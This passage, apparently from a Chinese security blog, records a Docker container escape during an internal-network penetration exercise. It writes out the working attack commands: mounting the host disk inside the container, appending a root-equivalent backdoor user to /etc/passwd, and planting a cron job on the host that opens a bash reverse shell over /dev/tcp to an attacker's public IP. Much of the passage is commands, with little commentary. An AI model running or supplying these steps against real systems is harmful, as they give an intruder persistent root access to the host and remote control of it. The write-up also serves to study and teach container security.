src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/14.png"></p><p><code>fdisk -l</code> 查看磁盘文件</p><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/10.png"></p><p>新建一个目录, 将/dev/vda1挂载至新建的目录</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-built_in">mkdir</span> <span class="hljs-keyword">abc</span><br>mount /dev/vda1 <span class="hljs-keyword">abc</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/11.png"></p><p>充满波折，不懂。。。</p><p>换个方法，</p><p>使用 /etc/passwd 创建root用户，</p><p>首先，使用perl语言生成带有盐值的密码：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">perl -le <span class="hljs-string">&#x27;print crypt(&quot;password@123&quot;,&quot;addedsalt&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><p>然后执行下面这条命令，成功将test用户的信息加入 /etc/passwd 文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &quot;test:advwtv/9yU5yQ:0:0:User_like_root:/root:/bin/bash&quot; &gt;&gt;/etc/passwd<br></code></pre></td></tr></table></figure><p>su test 切换过去</p><p>再执行 mount  /dev/vda1 abc</p><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/12.png"></p><p>现在能查看宿主机文件，接下来逃逸到宿主机</p><p>通过写入计划任务到宿主机</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &#x27;* * * * * bash -i &gt;&amp; /dev/tcp/公网ip/端口 0&gt;&amp;1&#x27; &gt;&gt; abc/var/spool/cron/root<br></code></pre></td></tr></table></figure><p>将python 反弹的脚本写进去，同样gg</p><p>最终，直接将反弹shell的脚本，写入宿主机的目录下 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim abc/root/shell.sh <br></code></pre></td></tr></table></figure><p>之后，赋予权限，直接执行反弹回shell</p>]]></content>
    
    
    <categories>
      
      <category>docker逃逸</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网渗透</tag>
      
      <tag>docker逃逸</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
